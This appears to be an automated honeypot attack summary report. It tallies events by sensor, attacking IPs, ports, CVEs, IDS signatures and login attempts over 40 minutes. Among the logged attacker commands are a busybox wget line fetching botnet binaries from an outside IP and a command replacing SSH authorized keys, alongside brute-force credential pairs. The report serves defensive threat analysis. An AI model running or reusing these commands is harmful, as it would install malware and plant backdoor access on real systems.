**Honeypot Attack Summary Report**

**Report Generation Time:** 2025-10-01T09:01:24Z
**Timeframe:** 2025-10-01T08:20:01Z to 2025-10-01T09:00:01Z
**Files:** agg_log_20251001T082001Z.json, agg_log_20251001T084001Z.json, agg_log_20251001T090001Z.json

**Executive Summary**

This report summarizes honeypot activity over a 40-minute period, based on three log files. A total of 22,999 events were recorded across various honeypots. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet-based threats. A significant portion of the attacks originated from the IP address 161.35.152.121. Attackers were observed attempting to download and execute malicious scripts, as well as attempting to gain access through brute-force login attempts with commonly used credentials.

**Detailed Analysis**

***Attacks by Honeypot***

*   **Cowrie:** 15,934
*   **Suricata:** 2,845
*   **Honeytrap:** 2,386
*   **Ciscoasa:** 1,425
*   **Dionaea:** 82
*   **Tanner:** 97
*   **Redishoneypot:** 69
*   **H0neytr4p:** 51
*   **Mailoney:** 39
*   **ConPot:** 22
*   **Adbhoney:** 21
*   **ElasticPot:** 5
*   **Heralding:** 3
*   **Honeyaml:** 8
*   **Dicompot:** 6
*   **Miniprint:** 2
*   **Sentrypeer:** 2
*   **Ipphoney:** 2

***Top Attacking IPs***

*   **161.35.152.121:** 11,239
*   **95.188.149.182:** 1,435
*   **138.68.167.183:** 989
*   **23.91.96.123:** 599
*   **200.7.101.139:** 367
*   **185.156.73.167:** 368
*   **92.63.197.55:** 362
*   **185.156.73.166:** 362
*   **92.63.197.59:** 330
*   **103.20.223.206:** 322
*   **200.44.190.194:** 322
*   **112.216.120.67:** 392
*   **122.155.0.205:** 434
*   **150.241.113.46:** 238
*   **209.141.57.124:** 214
*   **45.221.74.234:** 113
*   **101.36.107.103:** 159
*   **115.190.27.252:** 71
*   **3.137.73.221:** 79
*   **3.130.96.91:** 65

***Top Targeted Ports/Protocols***

*   **22:** 2,899
*   **TCP/445:** 1,438
*   **8333:** 163
*   **80:** 100
*   **6379:** 69
*   **443:** 51
*   **25:** 39
*   **TCP/80:** 57
*   **27017:** 26
*   **TCP/22:** 26
*   **8883:** 22
*   **9000:** 21
*   **8888:** 10
*   **TCP/443:** 22
*   **1025:** 12

***Most Common CVEs***

*   CVE-2021-3449
*   CVE-2019-11500
*   CVE-2002-0013
*   CVE-2002-0012
*   CVE-1999-0517
*   CVE-2023-26801
*   CVE-1999-0183
*   CVE-2019-16920
*   CVE-2024-12856
*   CVE-2024-12885
*   CVE-2014-6271
*   CVE-2023-52163
*   CVE-2023-47565
*   CVE-2023-31983
*   CVE-2024-10914
*   CVE-2009-2765
*   CVE-2024-3721
*   CVE-2015-2051
*   CVE-2024-33112
*   CVE-2022-37056
*   CVE-2019-10891
*   CVE-2006-3602
*   CVE-2006-4458
*   CVE-2006-4542
*   CVE-2021-42013
*   CVE-2024-4577
*   CVE-2002-0953
*   CVE-2021-41773

***Commands Attempted by Attackers***

*   `uname -a`
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
*   `cat /proc/cpuinfo | grep name | wc -l`
*   `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
*   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
*   `ls -lh $(which ls)`
*   `which ls`
*   `crontab -l`
*   `w`
*   `uname -m`
*   `cat /proc/cpuinfo | grep model | grep name | wc -l`
*   `top`
*   `uname`
*   `whoami`
*   `lscpu | grep Model`
*   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
*   `Enter new UNIX password:`
*   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

***Signatures Triggered***

*   **ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication:** 1428
*   **ET DROP Dshield Block Listed Source group 1:** 318
*   **ET SCAN NMAP -sS window 1024:** 177
*   **ET SCAN MS Terminal Server Traffic on Non-standard Port:** 123
*   **ET HUNTING RDP Authentication Bypass Attempt:** 47
*   **ET INFO Reserved Internal IP Traffic:** 60
*   **ET CINS Active Threat Intelligence Poor Reputation IP group 45:** 12
*   **ET CINS Active Threat Intelligence Poor Reputation IP group 48:** 11
*   **ET SCAN Potential SSH Scan:** 11
*   **ET CINS Active Threat Intelligence Poor Reputation IP group 43:** 29
*   **ET CINS Active Threat Intelligence Poor Reputation IP group 40:** 25
*   **ET INFO CURL User Agent:** 18
*   **ET DROP Spamhaus DROP Listed Traffic Inbound group 32:** 8
*   **ET DROP Spamhaus DROP Listed Traffic Inbound group 28:** 8
*   **ET CINS Active Threat Intelligence Poor Reputation IP group 46:** 13
*   **ET CINS Active Threat Intelligence Poor Reputation IP group 47:** 12
*   **ET Cins Active Threat Intelligence Poor Reputation IP group 12:** 9

***Users / Login Attempts***

*   **345gs5662d34/345gs5662d34:** 23
*   **root/nPSpP4PBW0:** 10
*   **geoserver/geoserver:** 8
*   **root/Mg123456:** 3
*   **work/workwork:** 3
*   **work/3245gs5662d34:** 3
*   **antonio/antonio:** 3
*   **ubuntu/Passw0rd:** 3
*   **old/3245gs5662d34:** 3
*   **agent/agent:** 4
*   **titu/Ahgf3487@rtjhskl854hd47893@#a4nC:** 3
*   **victor/victor1234:** 3
*   **geoserver/3245gs5662d34:** 3
*   **admin/kuba123:** 2
*   **admin/cheryl123:** 2
*   **admin/P@ssw0rd.2020:** 2

***Files Uploaded/Downloaded***

*   sh
*   arm.urbotnetisass
*   arm5.urbotnetisass
*   arm6.urbotnetisass
*   arm7.urbotnetisass
*   x86_32.urbotnetisass
*   mips.urbotnetisass
*   mipsel.urbotnetisass
*   rondo.dgx.sh
*   apply.cgi
*   welcome.jpg
*   writing.jpg
*   tags.jpg
*   nse.html

***HTTP User-Agents***

*   *No user agents recorded in this period.*

***SSH Clients and Servers***

*   *No specific SSH clients or servers recorded in this period.*

***Top Attacker AS Organizations***

*   *No AS organization data recorded in this period.*

**Key Observations and Anomalies**

*   **High Volume of Cowrie Attacks:** The overwhelming number of events on the Cowrie honeypot suggests a sustained, automated campaign targeting SSH and Telnet services.
*   **Dominant Attacker IP:** The IP address 161.35.152.121 was responsible for a large percentage of the total attack volume, indicating a single, highly active threat source.
*   **Malware Download Attempts:** The commands executed by attackers, particularly those involving `wget` and `curl` to download files like `arm.urbotnetisass`, point to attempts to install malware on compromised systems.
*   **Credential Stuffing:** The variety of usernames and passwords used in login attempts is indicative of credential stuffing attacks, where attackers use lists of stolen credentials to gain unauthorized access.
*   **DoublePulsar Backdoor:** The most frequently triggered Suricata signature relates to the DoublePulsar backdoor, which is associated with the EternalBlue exploit. This suggests that systems are still being targeted with this well-known vulnerability.

This concludes the Honeypot Attack Summary Report.